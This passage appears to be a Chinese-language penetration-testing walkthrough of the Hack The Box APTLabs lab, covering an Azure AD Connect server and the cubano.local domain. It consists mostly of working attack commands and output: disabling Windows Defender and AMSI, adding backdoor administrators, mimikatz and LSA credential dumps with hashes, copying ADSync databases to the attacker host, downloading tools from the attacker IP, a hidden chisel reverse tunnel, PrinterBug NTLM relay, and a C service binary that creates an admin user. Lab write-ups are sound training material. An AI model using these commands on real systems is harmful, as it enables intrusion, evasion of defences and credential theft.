reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d 4 /f
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Idle Maintenance" /Disable
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v "ForceUpdateFromMU" /t REG_DWORD /d 0 /f
net stop WinDefend /y
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f
takeown /f "C:\Program Files\Windows Defender" /r
icacls "C:\Program Files\Windows Defender" /grant administrators:F /t
rmdir /s /q "C:\Program Files\Windows Defender"
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Stop-Service -Name WinDefend -Force
Set-Service -Name WinDefend -StartupType Disabled
sc config WinDefend start= disabled
powershell.exe -NoP -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true"
powershell.exe -NoP -Command "(Get-MpPreference).DisableRealtimeMonitoring"
powershell.exe -NoP -Command "(Get-MpComputerStatus).RealTimeProtectionEnabled"
cmd /c "sc query WinDefend"
cmd /c "sc stop WinDefend"
cmd /c "sc config WinDefend start= disabled"
cmd /c "sc query WinDefend"
```

### 添加管理

```plain
cmd /c "net localgroup Administrators heathcliff /add"
net localgroup "Remote Desktop Users" heathcliff /add
```

#### lsadump::secrets
> Secret  : _SC_ADSync / service 'ADSync' with username : NT SERVICE\ADSync
>
> + `**_SC_ADSync**`：
>     - `_SC_` 前缀表示这是一个 **服务（Service）** 的机密信息
>     - `ADSync` 是服务名称，通常是 **Azure AD Connect** 同步服务（Microsoft Entra Connect Sync）
> + `**service 'ADSync'**`：  
明确指出了受影响的本地服务名称
> + `**username : NT SERVICE\ADSync**`：  
这是该服务运行所用的账户
>     - `NT SERVICE\` 前缀表示一个**虚拟服务账户**（Virtual Service Account）
>     - 这类账户是 Windows 7 / Windows Server 2008 R2 及更新系统中引入的，用于运行 Windows 服务，**没有真正的密码**（由 SCM 服务控制管理器管理其令牌）
>

```plain
C:\Users\Public\mimikatz.exe "privilege::debug" "lsadump::secrets" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36

 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
```

### ADSync
> Azure AD Connect是一个位于企业混合身份验证体系核心的战略要地，它是一个位于网络边界上的高价值目标，一旦攻破，就能成为攻击者横向移动、甚至接管整个云环境的“万能钥匙"
>

#### SC服务
> + **启动类型**：`DISABLED`（禁用）
> + **运行状态**：`STOPPED`（已停止）
> + **进程ID**：`0`（没有进程在运行）
>
> 这意味着 **ADSync 服务目前完全没有在运行**，也不会在系统启动时自动启动
>

```plain
C:\>sc qc ADSync

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: ADSync
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 4   DISABLED
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Microsoft Azure AD Sync
        DEPENDENCIES       : winmgmt
        SERVICE_START_NAME : NT SERVICE\ADSync

C:\>sc queryex ADSync

SERVICE_NAME: ADSync 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 0
        FLAGS              : 
```

#### 传输文件
##### SMB 共享
> kali中启动smb共享，方便靶机传输文件
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs/]
└─# mkdir -p /home/kali/Desktop/htb/Aptlabs/orbitfish_adsync

┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs/]
└─# impacket-smbserver loot /home/kali/Desktop/htb/Aptlabs/orbitfish_adsync -smb2support -username heathcliff -password 'Pass@123'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

##### 挂载共享
> 靶机连回共享文件夹
>

```plain
C:\>net use \\10.10.16.14\loot /user:heathcliff Pass@123
The command completed successfully.
```

##### 数据传回
```plain
C:\>copy /y "C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf" \\10.10.16.14\loot\
        1 file(s) copied.

C:\>copy /y "C:\Program Files\Microsoft Azure AD Sync\Data\ADSync_log.LDF" \\10.10.16.14\loot\
        1 file(s) copied.
```

### 搭建隧道:1084
#### upload
```plain
copy /y \\10.10.16.14\loot\chisel.exe "C:\ProgramData\chisel.exe" 
```

#### run:1084
```plain
Start-Process powershell.exe "-WindowStyle Hidden -Command `"while(`$true){C:\ProgramData\chisel.exe client 10.10.16.14:9999 R:1084:socks; sleep 5}`""
```

### RDP
#### 启动
```plain
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="Remote Desktop" dir=in action=allow protocol=TCP localport=3389
sc start TermService
```

#### 连接
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/adconnectdump]
└─# proxychains -q xfreerdp /v:192.168.22.123 /u:heathcliff /p:'Pass@123' +clipboard /dynamic-resolution      
```

#### ADSync（失联）
![](/image/hackthebox-prolabs/Aptlabs-27.png)

#### 启动服务
```plain
C:\>sc config ADSync start= demand
[SC] ChangeServiceConfig SUCCESS

C:\>sc start ADSync

SERVICE_NAME: ADSync 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 5636
        FLAGS              : 
```

#### ADSync
![](/image/hackthebox-prolabs/Aptlabs-28.png)

### Adconnectdump
> 项目地址：
>
> [https://github.com/dirkjanm/adconnectdump](https://github.com/dirkjanm/adconnectdump)
>
> 二进制工具：
>
> [https://dev.azure.com/dirkjanm/adconnectdump/_build/results?buildId=2388&view=artifacts&pathAsName=false&type=publishedArtifacts](https://dev.azure.com/dirkjanm/adconnectdump/_build/results?buildId=2388&view=artifacts&pathAsName=false&type=publishedArtifacts)
>

#### ADSyncGather
##### upload
```plain
C:\>powershell -c "iwr http://10.10.16.14:88/ADSyncGather.exe -OutFile C:\ProgramData\AG.exe"
```

##### run
```plain
C:\ProgramData\AG.exe
Opening database Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync;Connect Timeout=30
Record: : : ;
Record: : : ;
Config: e1db80e7-5c88-402e-985d-8cdc9a76d66e;100000;e6184885-8b1c-466f-94ed-73d86d857971
key is null
```

##### download
> 需要将输出的文本传回kali中
>

```plain
C:\ProgramData\AG.exe > C:\ProgramData\output.txt 2>&1
C:\>copy /y C:\ProgramData\output.txt \\10.10.16.14\loot\
        1 file(s) copied.
```

#### adconnectdump
##### 整理文件
```plain
cp /home/kali/Desktop/htb/Aptlabs/orbitfish_adsync/output.txt /home/kali/Desktop/tools/adconnectdump/
cp /home/kali/Desktop/htb/Aptlabs/orbitfish_adsync/ADSync.mdf /home/kali/Desktop/tools/adconnectdump/
cp /home/kali/Desktop/htb/Aptlabs/orbitfish_adsync/ADSync_log.LDF /home/kali/Desktop/tools/adconnectdump/
cp /home/kali/Desktop/tools/adconnectdump/ADSyncDecrypt/ADSyncQuery/Release/ADSyncQuery.exe /home/kali/Desktop/tools/adconnectdump/
```

##### run
> 拿到MSOL_2a1d03e02d11用户
>

```plain
┌──(kali㉿kali)-[~/Desktop/tools/adconnectdump]
└─$ proxychains -q python2 ./adconnectdump.py SRV001/Administrator@192.168.22.123 -hashes :3531cfe984184c7223d5d76afcb96898 --existing-db --from-file output.txt 
Azure AD Connect remote credential dumper - by @_dirkjan
[*] Loading configuration data from output.txt on filesystem
```

# Intranet Penetration-Cubano.local
## SERVICEDESK-信息收集
> 我们曾经在入口机-10.10.110.13的DNS服务器中发现了一条记录
>

```plain
7/153	Cubano.local	DC.Cubano.local	A	192.168.23.10	3600
```

> 经过尝试确定192.168.21.123-SERVICEDESK服务器可以连通Cubano域内服务器
>
> 我们使用192.168.21.123-SERVICEDESK中代理出来的隧道进行渗透测试
>

### netexec
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q netexec smb 192.168.23.0/24
SMB         192.168.23.164  445    DEV              [*] Windows Server 2019 Standard 17763 x64 (name:DEV) (domain:cubano.local) (signing:False) (SMBv1:True)
SMB         192.168.23.146  445    EXCHANGE         [*] Windows Server 2019 Standard 17763 x64 (name:EXCHANGE) (domain:cubano.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         192.168.23.10   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:cubano.local) (signing:True) (SMBv1:None) (Null Auth:True)
```

> 发现了一个奇怪的现象，随手测了个账户结果都会返回guest....
>
> 该域实际上启用了**空会话或匿名访问**，但被限制在Guest级别
>

```plain
┌──(web)─(root㉿kali)-[/home/…/Desktop/tools/Rubeus/2.2.0]
└─# proxychains -q netexec smb 192.168.23.10/24 -u 'test' -p 'test' -d 'cubano.local'
SMB         192.168.23.164  445    DEV              [*] Windows Server 2019 Standard 17763 x64 (name:DEV) (domain:cubano.local) (signing:False) (SMBv1:True)
SMB         192.168.23.146  445    EXCHANGE         [*] Windows Server 2019 Standard 17763 x64 (name:EXCHANGE) (domain:cubano.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         192.168.23.10   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:cubano.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.23.164  445    DEV              [-] cubano.local\test:test STATUS_LOGON_FAILURE 
SMB         192.168.23.146  445    EXCHANGE         [+] cubano.local\test:test (Guest)
SMB         192.168.23.10   445    DC               [+] cubano.local\test:test (Guest)
```

### hosts添加
```plain
echo "192.168.23.10 dc.cubano.local dc" | sudo tee -a /etc/hosts
echo "192.168.23.146 exchange.cubano.local exchange" | sudo tee -a /etc/hosts
echo "192.168.23.164 dev.cubano.local dev" | sudo tee -a /etc/hosts
```

### fscan
#### upload
> 通过靶机192.168.21.123-SERVICEDESK进行端口扫描，记得先关闭防护
>

```plain
*Evil-WinRM* PS C:\Users\Public> upload /home/kali/Desktop/tools/fscan/fscan.exe
```

### Kerberosting
> 需要一个用户进行请求
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─#  proxychains -q impacket-GetUserSPNs 'cubano.local/' -dc-ip 192.168.23.10 -request -no-pass

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName     Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
-----------------------  -------  --------  --------------------------  --------------------------  ----------
HTTP/vault.cubano.local  support            2020-11-19 11:12:47.634906  2026-04-09 20:19:16.718502             



[-] CCache file is not found. Skipping...
[-] invalid principal syntax
```

### guest认证
#### 命令
```plain
proxychains -q curl -skI https://exchange.cubano.local/ews/Exchange.asmx
proxychains -q curl -skI https://exchange.cubano.local/Autodiscover/Autodiscover.xml
proxychains -q curl -skI https://exchange.cubano.local/Microsoft-Server-ActiveSync
proxychains -q curl -sk --ntlm -u 'CUBANO\\guest:' -D - -o /dev/null https://exchange.cubano.local/EWS/Exchange.asmx
proxychains -q curl -sk --ntlm -u 'CUBANO\\guest:' -D - -o /dev/null https://exchange.cubano.local/Autodiscover/Autodiscover.xml
```

#### 输出
未使用 `CUBANO\\guest:`

> + `/ews/Exchange.asmx` -> `HTTP/2 401`，明确给出 `WWW-Authenticate: Negotiate` / `NTLM`
> + `/Autodiscover/Autodiscover.xml` -> `HTTP/2 401`，给出 `Negotiate` / `NTLM` / `Basic realm="exchange.cubano.local"`
> + `/Microsoft-Server-ActiveSync` -> `HTTP/2 401`，`Basic realm="exchange.cubano.local"`
>

使用 `CUBANO\\guest:` 

> + 对 `/EWS/Exchange.asmx` 与 `/Autodiscover/Autodiscover.xml` 做 `NTLM` 认证后，前端先返回 `401 Unauthorized` 的 NTLM challenge，随后返回 `503 Service Unavailable`
> + 两个经 `guest` 认证后的响应都带 `X-CalculatedBETarget: exchange.cubano.local`、`Persistent-Auth: true`、`X-FEServer: EXCHANGE`
>

#### 结论
+ `exchange.cubano.local` 的 Exchange 前端面真实存在，且不是只有 OWA 一个入口
+ `guest:''` 可以在 Exchange HTTP 面上完成 `NTLM` 协商到后端阶段
+ 当前最自然的下一步是直接尝试 `PrivExchange / relay -> support`，而不是继续做低价值的大枚举

###  rpcdump 
> 目标 **存在 Print Spooler 远程接口**，可以尝试使用 PrinterBug 漏洞
>

```plain
┌──(kali㉿kali)-[~/Desktop/htb/Aptlabs]
└─$ proxychains -q rpcdump.py -port 135 192.168.23.146 | grep -iE "spoolss|MS-RPRN|spoolsv"
Provider: spoolsv.exe 
Provider: spoolsv.exe 
Provider: spoolsv.exe 
Provider: spoolsv.exe 
Protocol: [MS-RPRN]: Print System Remote Protocol 
Provider: spoolsv.exe 
```

### ntlmrelayx-exchange
[Relaying credentials everywhere with ntlmrelayx](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)

[Abusing Exchange: One API call away from Domain Admin](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)

> **中继攻击的原理：**
>
> NTLM 中继攻击的本质是 窃取一台机器的身份认证（如 Exchange 服务器），然后将其 重放到另一台机器（如dev ）上执行操作。攻击者（Kali）充当中介，将截获的认证流量转发到目标机器（dev），而非在 Kali 本地执行命令。
>
> **渗透思路：**
>
> 1. 使用printerbug.py触发Exchange服务器（exchange.cubano.local）向攻击者控制的IP（10.10.16.14）发起SMB连接（回连）
> 2. 攻击者使用ntlmrelayx监听在10.10.16.14（或相应的接口），当Exchange服务器连接过来时，ntlmrelayx会捕获其NTLM认证信息，并将这个认证中继到目标机器dev.cubano.local
> 3. 由于Exchange服务器以机器账户（CUBANO/EXCHANGE$）的身份进行认证，而dev机器可能信任域中的机器账户（或者因为SMB签名未启用等原因），所以中继认证成功，ntlmrelayx在dev机器上执行了指定的命令
>

#### privexchange
##### 命令
> -ev`2016` 表示目标服务器运行的是 Microsoft Exchange Server 2016
>

```plain
proxychains -q /usr/bin/python3 /home/kali/Desktop/tools/impacket/examples/ntlmrelayx.py --remove-mic --escalate-user support -t ldap://dc.cubano.local -smb2support
proxychains -q python3 /home/kali/Desktop/tools/PrivExchange/privexchange.py exchange.cubano.local -d cubano.local -u guest -p '' -ah 10.10.16.14
proxychains -q python3 /home/kali/Desktop/tools/PrivExchange/privexchange.py exchange.cubano.local -d cubano.local -u guest -p '' -ah 10.10.16.14 -ev 2016 --debug
```

##### 输出
+ 本地 `ntlmrelayx.py` 可用，监听 `80/445` 正常启动，目标为 `ldap://dc.cubano.local`
+ `privexchange.py` 默认方言与 `-ev 2016` 两次尝试都在 `guest` 完成 `401 -> NTLM` 后直接返回 `HTTP 503`
+ `--debug` 明确显示：`DEBUG: Got 401, performing NTLM authentication`，随后 `DEBUG: HTTP status: 503`
+ relay 监听侧没有看到任何来自 `exchange.cubano.local` 的 HTTP/SMB 回连

##### 结论
+ 当前真实现场里，`guest:'' -> PrivExchange -> ldap://dc.cubano.local --escalate-user support` 这条路没有直接打通
+ 后续真正推进的是 `printerbug` 触发 `EXCHANGE$` 回连，再 relay 到 `dev.cubano.local`，拿下 `DEV\\Administrator` 后在 `dev` 上提取到 `support` 的 `NTLM`
+ 因此当前最自然的下一步应切到 `exchange -> printerbug -> ntlmrelayx -> smb://dev.cubano.local`

#### printerbug
##### 命令
> 这个31d6cfe0d16ae931b73c59d7e0c089c0哈希对应空密码的guest用户
>

```plain
proxychains -q /usr/bin/python3 /home/kali/Desktop/tools/impacket/examples/ntlmrelayx.py -t smb://dev.cubano.local -smb2support 
proxychains -q python3 /home/kali/Desktop/tools/krbrelayx/printerbug.py 'cubano.local/guest@exchange.cubano.local' 10.10.16.14 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -target-ip 192.168.23.146
```

##### 输出
```plain
[*] Servers started, waiting for connections
[*] (SMB): Received connection from 10.10.110.50, attacking target smb://dev.cubano.local
[*] (SMB): Authenticating connection from CUBANO/EXCHANGE$@10.10.110.50 against smb://dev.cubano.local SUCCEED [1]
[*] All targets processed!
[*] (SMB): Connection from 10.10.110.50 controlled, but there are no more targets left!
[*] All targets processed!
[*] (SMB): Connection from 10.10.110.50 controlled, but there are no more targets left!
[*] smb://CUBANO/EXCHANGE$@dev.cubano.local [1] -> Service RemoteRegistry is in stopped state
[*] smb://CUBANO/EXCHANGE$@dev.cubano.local [1] -> Starting service RemoteRegistry
[*] smb://CUBANO/EXCHANGE$@dev.cubano.local [1] -> Target system bootKey: 0xd397e86e11793ab727a9e463ef87ce33
[*] smb://CUBANO/EXCHANGE$@dev.cubano.local [1] -> Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

+ `printerbug.py` 虽然最后报 `RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR`
+ 但 relay 侧已经明确收到并利用了该回连：
    - `Received connection from 10.10.110.50, attacking target smb://dev.cubano.local`
    - `Authenticating connection from CUBANO/EXCHANGE$@10.10.110.50 against smb://dev.cubano.local SUCCEED [1]`
+ `ntlmrelayx` 随后继续执行：
    - `Service RemoteRegistry is in stopped state`
    - `Starting service RemoteRegistry`
    - `Target system bootKey: 0xd397e86e11793ab727a9e463ef87ce33`
    - `Dumping local SAM hashes (uid:rid:lmhash:nthash)`
+ 但在当前环境里，默认 `SAM dump` 阶段未正常回显最终 hash，进程长时间卡住，只能先中断

##### 结论
+ `guest:''` 足以通过 `printerbug` 成功逼出 `EXCHANGE$` 对我方的 SMB 回连
+ `EXCHANGE$` 对 `dev.cubano.local` 的 SMB relay 在现场是可成功认证的
+ 当前已确认存在一条真实可用的 `exchange -> EXCHANGE$ -> dev` 横向路径
+ 下一步不应再回到 `PrivExchange`，而应把 relay 改成显式 `-c` 命令执行或其他更稳定的落地方式

#### 命令验证
##### 命令
```plain
proxychains -q /usr/bin/python3 /home/kali/Desktop/tools/impacket/examples/ntlmrelayx.py -t smb://dev.cubano.local -smb2support -c 'net user heathcliff Pass@123 /add && net localgroup Administrators heathcliff /add'
proxychains -q python3 /home/kali/Desktop/tools/krbrelayx/printerbug.py 'CUBANO/guest@exchange.cubano.local' 10.10.16.14 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -target-ip 192.168.23.146
```

##### 输出
+ `printerbug` 侧这次完整走到：
    - `Bind OK`
    - `Got handle`
    - `Triggered RPC backconnect, this may or may not have worked`
+ relay 侧收到并利用回连：
    - `Received connection from 10.10.110.50, attacking target smb://dev.cubano.local`
    - `Authenticating connection from CUBANO/EXCHANGE$@10.10.110.50 against smb://dev.cubano.local SUCCEED [1]`
    - `Executed specified command on host: dev.cubano.local`
+ 随后回显抓取报错：
    - `SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND`

##### 结论
+ 该 relay 链在当前现场不仅能认证到 `dev`，而且已经能实际执行命令
+ 当前问题不在权限，而在 `ntlmrelayx` 这版环境对命令回显/输出文件的处理不稳定
+ 下一步最自然的动作是执行一个“不依赖输出回显”的命令，例如直接创建本地管理员用户，再用该新落点自行登录 `dev`

#### 创建本地管理员
##### msf（被杀）
```plain
msfvenom -p windows/x64/exec CMD='net user heathcliff Pass@123 /add && net localgroup Administrators heathcliff /add' -f exe -o devaddadmin.exe
```

##### gcc
###### 脚本
```plain
#include <windows.h>

static SERVICE_STATUS g_status;
static SERVICE_STATUS_HANDLE g_status_handle;

static void report_status(DWORD state, DWORD win32_exit_code, DWORD wait_hint) {
    g_status.dwCurrentState = state;
    g_status.dwWin32ExitCode = win32_exit_code;
    g_status.dwWaitHint = wait_hint;
    SetServiceStatus(g_status_handle, &g_status);
}

static DWORD run_command(void) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    DWORD exit_code = 1;
    char cmd[] =
        "cmd.exe /c net user heathcliff Pass@123 /add && "
        "net localgroup Administrators heathcliff /add";

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return GetLastError();
    }

    WaitForSingleObject(pi.hProcess, 30000);
    GetExitCodeProcess(pi.hProcess, &exit_code);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return exit_code;
}

static VOID WINAPI service_ctrl_handler(DWORD ctrl_code) {
    if (ctrl_code == SERVICE_CONTROL_STOP) {
        report_status(SERVICE_STOPPED, NO_ERROR, 0);
    }
}

static VOID WINAPI service_main(DWORD argc, LPSTR *argv) {
    const char *service_name = (argc > 0 && argv[0]) ? argv[0] : "";
    DWORD cmd_exit_code;

    g_status_handle = RegisterServiceCtrlHandlerA(service_name, service_ctrl_handler);
    if (!g_status_handle) {
        return;
    }

    ZeroMemory(&g_status, sizeof(g_status));
    g_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_status.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    report_status(SERVICE_START_PENDING, NO_ERROR, 3000);
    report_status(SERVICE_RUNNING, NO_ERROR, 0);

    cmd_exit_code = run_command();
    report_status(SERVICE_STOPPED, cmd_exit_code == 0 ? NO_ERROR : cmd_exit_code, 0);
}

int main(void) {
    SERVICE_TABLE_ENTRYA dispatch_table[] = {
        {"", (LPSERVICE_MAIN_FUNCTIONA)service_main},
        {NULL, NULL}
    };

    if (!StartServiceCtrlDispatcherA(dispatch_table)) {
        return (int)GetLastError();
    }
    return 0;
}
```

###### 生成
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# x86_64-w64-mingw32-gcc -o add_admin.exe add_admin.c -static -lws2_32
```

##### 凭据
+ `DEV\\heathcliff / Pass@123`

##### 命令
```plain
proxychains -q /usr/bin/python3 /home/kali/Desktop/tools/impacket/examples/ntlmrelayx.py -t smb://dev.cubano.local -smb2support -e /home/kali/Desktop/htb/Aptlabs/add_admin.exe
proxychains -q python3 /home/kali/Desktop/tools/krbrelayx/printerbug.py 'CUBANO/guest@exchange.cubano.local' 10.10.16.14 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -target-ip 192.168.23.146
proxychains -q nxc winrm dev.cubano.local -u heathcliff -p 'Pass@123' --local-auth
```

##### 输出
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q nxc winrm dev.cubano.local -u heathcliff -p 'Pass@123' --local-auth
WINRM       192.168.23.164  5985   DEV              [*] Windows 10 / Server 2019 Build 17763 (name:DEV) (domain:cubano.local)
WINRM       192.168.23.164  5985   DEV              [-] DEV\heathcliff:Pass@123
                                                                                                        
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q nxc winrm dev.cubano.local -u heathcliff -p 'Pass@123' --local-auth
WINRM       192.168.23.164  5985   DEV              [*] Windows 10 / Server 2019 Build 17763 (name:DEV) (domain:cubano.local)
WINRM       192.168.23.164  5985   DEV              [+] DEV\heathcliff:Pass@123 (Pwn3d!)
```

+ `devaddsvc.exe` 是一个真正的 Windows service PE，内部执行：
    - `net user heathcliff Pass@123 /add`
    - `net localgroup Administrators heathcliff /add`
+ relay 侧完整走到：
    - `Found writable share ADMIN$`
    - `Uploading file LKUsQbgv.exe`
    - `Opening SVCManager on dev.cubano.local`
    - `Creating service IhSa on dev.cubano.local`
    - `Starting service IhSa`
    - `Service Installed.. CONNECT!`
    - `Stopping service IhSa`
    - `Removing service IhSa`
    - `Removing file LKUsQbgv.exe`
+ 新账户验证结果：
    - `WINRM 192.168.23.164 5985 DEV [+] DEV\\heathcliff:Pass@123 (Pwn3d!)`
+ `whoami /all` 显示：
    - 当前用户 `dev\\heathcliff`
    - 属于 `BUILTIN\\Administrators`
    - 具备 `SeDebugPrivilege` 等高权限
+ `C:\\Users\\Administrator\\Desktop\\flag.txt` 内容：
    - `APTLABS{0N3_w@Y_t0_@Bu$3_Sp00LeR_bUg}`

##### 结论
+ 当前已不再只是“能 relay 到 dev”，而是已经拿到 `dev.cubano.local` 的稳定本地管理员落点
+ 下一步应从 `DEV\\svc_apt` 出发，在 `dev` 上提取 `support` / `DEV$` / 其他下一跳所需的 hash 或明文凭据

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q netexec smb dev.cubano.local -u heathcliff -p 'Pass@123' --local-auth --lsa
SMB         192.168.23.164  445    DEV              [*] Windows Server 2019 Standard 17763 x64 (name:DEV) (domain:DEV) (signing:False) (SMBv1:True)
SMB         192.168.23.164  445    DEV              [+] DEV\heathcliff:Pass@123 (Pwn3d!)
SMB         192.168.23.164  445    DEV              [*] Dumping LSA secrets
SMB         192.168.23.164  445    DEV              CUBANO.LOCAL/Administrator:$DCC2$10240#Administrator#a3118c0355c1b19322960df4ac180d79: (2020-04-17 13:52:32)                                                
SMB         192.168.23.164  445    DEV              CUBANO\DEV$:aes256-cts-hmac-sha1-96:0b5ecfb308c0be407167359d12b723cabd150c04073ccbe558be9a13e24eaf0f                                                        
SMB         192.168.23.164  445    DEV              CUBANO\DEV$:aes128-cts-hmac-sha1-96:85c00bfb7897a710b972a1516b39e34f                                                                                        
SMB         192.168.23.164  445    DEV              CUBANO\DEV$:des-cbc-md5:860b97ab67973158
SMB         192.168.23.164  445    DEV              CUBANO\DEV$:plain_password_hex:                                                             
SMB         192.168.23.164  445    DEV              CUBANO\DEV$:aad3b435b51404eeaad3b435b51404ee:0e6662fe0ff3cb363d63c69f0839f7eb:::                                                                            
SMB         192.168.23.164  445    DEV              dpapi_machinekey:0x9044aafa6263ac1f5e4fabb97843379c12f59e82                                                                                                 
SMB         192.168.23.164  445    DEV						  dpapi_userkey:0xbc3468d768b5b3e0582141b551b68452bddb1af1
```

+ `LSA` 成功导出：
    - `CUBANO.LOCAL/Administrator:$DCC2$10240#Administrator#a3118c0355c1b19322960df4ac180d79`
    - `CUBANO\\DEV$:...:0e6662fe0ff3cb363d63c69f0839f7eb`
    - `CUBANO\\DEV$` 的 `aes256/aes128/des/plain_password_hex`
    - `dpapi_machinekey` / `dpapi_userkey`

### evil-winrm-Administrator
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q evil-winrm -i 192.168.23.164 -u Administrator -H e7edd1fbf2c56ad73c955a68606b2898
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                              
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                         
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### psexec-Administrator
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Aptlabs]
└─# proxychains -q psexec.py DEV/Administrator@dev.cubano.local -hashes :e7edd1fbf2c56ad73c955a68606b2898
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dev.cubano.local.....
[*] Found writable share ADMIN$
[*] Uploading file nYoMkHUQ.exe
[*] Opening SVCManager on dev.cubano.local.....
[*] Creating service CfLK on dev.cubano.local.....
[*] Starting service CfLK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1577]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

### 凭据获取
#### Mimikatz
##### upload
```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /home/kali/Desktop/tools/mimikatz/x64/mimikatz.exe 
```

##### sekurlsa::logonpasswords
> 这里我用的是psexec跑出来的，尝试了其它的没跑全
>

```plain
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### GetNPUsers
### LDAP-Delegation
> 发现albany等用户为Unconstrained，接下来将围绕albany进行
>

#### 命令
```plain
proxychains -q netexec ldap dc.cubano.local -u 'DEV$' -H 0e6662fe0ff3cb363d63c69f0839f7eb -d cubano.local --find-delegation
proxychains -q netexec ldap dc.cubano.local -u support -H 97179aeefd6f3a6d329c37184fc639af -d cubano.local --find-delegation
```

#### 输出

```plain
